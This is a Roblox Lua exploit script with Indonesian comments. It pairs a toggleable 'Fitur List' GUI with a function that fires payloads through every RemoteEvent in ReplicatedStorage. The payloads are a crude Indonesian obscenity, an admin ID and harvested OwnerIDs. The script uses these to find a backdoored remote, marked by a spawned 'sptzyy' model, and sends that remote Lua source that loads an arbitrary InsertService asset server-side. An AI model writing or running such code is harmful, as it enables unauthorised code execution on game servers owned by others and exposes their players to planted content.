-- Fungsi untuk membuat GUI fitur
local function createFiturGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FiturListGUI"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false

    -- Frame utama
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 350, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    mainFrame.Visible = false

    -- Fungsi drag untuk mainFrame
    do
        local dragging = false
        local dragInput, dragStart, startPos

        local function update(input)
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end

        mainFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = mainFrame.Position
                input.Changed:Connect(function()
                    if not input.UserInputState or input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)

        mainFrame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)

        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
    end

    -- Title dengan emoji 👑
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextSize = 24
    titleLabel.Text = "👑 Fitur List"
    titleLabel.Parent = mainFrame

    -- Tombol Close
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 40, 0, 40)
    closeBtn.Position = UDim2.new(1, -50, 0, 10)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.Font = Enum.Font.SourceSansBold
    closeBtn.TextSize = 24
    closeBtn.Parent = mainFrame

    -- Daftar fitur
    local fiturText = Instance.new("TextLabel")
    fiturText.Size = UDim2.new(1, -20, 1, -100)
    fiturText.Position = UDim2.new(0, 10, 0, 50)
    fiturText.BackgroundTransparency = 1
    fiturText.TextColor3 = Color3.new(1, 1, 1)
    fiturText.Font = Enum.Font.SourceSans
    fiturText.TextSize = 18
    fiturText.TextWrapped = true
    fiturText.Text = "- Fitur 1\n- Fitur 2\n- Fitur 3\n- Fitur 4\n" -- bisa diubah sesuai fitur
    fiturText.Parent = mainFrame

    -- Fungsi toggle GUI
    local function toggle()
        mainFrame.Visible = not mainFrame.Visible
    end

    -- Toggle GUI dengan tombol (contoh: dengan tombol di luar)
    local toggleButton = Instance.new("TextButton")
    toggleButton.Size = UDim2.new(0, 50, 0, 50)
    toggleButton.Position = UDim2.new(0, 10, 0, 10)
    toggleButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    toggleButton.Text = "👑"
    toggleButton.TextSize = 24
    toggleButton.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    toggleButton.MouseButton1Click:Connect(function()
        toggle()
    end)

    -- Close Button
    closeBtn.MouseButton1Click:Connect(function()
        mainFrame.Visible = false
    end)

    return {
        toggle = toggle,
        gui = mainFrame
    }
end

-- Membuat GUI fitur
local fiturGUI = createFiturGUI()

-- Fungsi utama logika yang Anda berikan, dipanggil saat ingin aktifkan
local function jalankanFitur()
    local modelName = "sptzyy"
    local zyy = nil
    local lastFired = nil

    local adminPayloads = {9880962516} -- Daftar ID admin

    -- Hapus objek dengan nama modelName dari workspace
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj.Name == modelName then
            obj:Destroy()
        end
    end

    -- Deteksi saat objek dengan nama modelName ditambahkan ke workspace
    workspace.ChildAdded:Connect(function(child)
        if child.Name == modelName and zyy == nil then
            zyy = lastFired
            print("Found zyy!")
        end
    end)

    local payload = "KONTOL MESUM😂"

    -- Kirim payload ke semua RemoteEvent yang ditemukan
    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(payload)
            end)
            lastFired = remote
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    task.wait(0.5)

    -- Kirim payload admin ID
    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            for _, payloadID in ipairs(adminPayloads) do
                pcall(function()
                    remote:FireServer(payloadID)
                end)
            end
            lastFired = remote
            game:GetService("RunService").RenderStepped:Wait()
        end
    end

    -- Mengumpulkan ID otomatis dari objek yang memiliki properti OwnerID
    local ownerIDList = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj:FindFirstChild("OwnerID") then
            local ownerID = obj.OwnerID.Value
            if not table.find(ownerIDList, ownerID) then
                table.insert(ownerIDList, ownerID)
            end
        end
    end

    -- Kirim ke semua ID pemilik yang dikumpulkan
    for _, ownerID in ipairs(ownerIDList) do
        for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(ownerID)
                end)
                lastFired = remote
                game:GetService("RunService").RenderStepped:Wait()
            end
        end
    end

    -- Jika zyy ditemukan dan valid, kirim payload ke zyy
    if zyy and typeof(zyy) == "Instance" then
        local playerName = game.Players.LocalPlayer.Name
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        zyy:FireServer(insertPayload)
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "sptzyy",
            Text = ":(",
            Icon = "",
            Duration = 5,
        })
    end
end

-- Anda bisa panggil fitur GUI toggle atau langsung jalankan fungsi sesuai kebutuhan
-- Contoh: fiturGUI.toggle() untuk menampilkan GUI